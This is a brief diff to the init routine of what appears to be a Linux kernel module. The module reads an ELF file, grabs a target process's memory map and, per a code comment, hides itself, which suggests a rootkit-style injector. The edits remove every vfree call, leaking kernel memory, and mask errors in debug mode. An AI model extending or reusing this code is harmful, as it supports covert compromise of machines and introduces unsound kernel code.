@@ -77,12 +77,10 @@ static int __init entry(void) {
     filp_close(filp, NULL);
 
     if (ret > 40) {
-        vfree(buf);
         return DEBUG_MODE ? 0 : -EAGAIN;
     }
 
     if (buf[0] != 0x45 || buf[1] != 0x4c || buf[2] != 0x46) {
-        vfree(buf);
         return DEBUG_MODE ? 0 : -EBADF;
     }
 
@@ -103,8 +101,7 @@ static int __init entry(void) {
     if (mm && prc)
         mm = get_task_mm(prc); // just for sure
     else{
-        vfree(buf);
-        return -ESRCH;
+        return DEBUG_MODE ? 0 : -ESRCH;
     }
 
     //prepare end
@@ -114,8 +111,7 @@ static int __init entry(void) {
 
     }// header + sections header
 
-    vfree(buf);
-    return 0;
+    return 0; // Returning error crashing system if module is hided
 }
 
 static void __exit exit(void) {
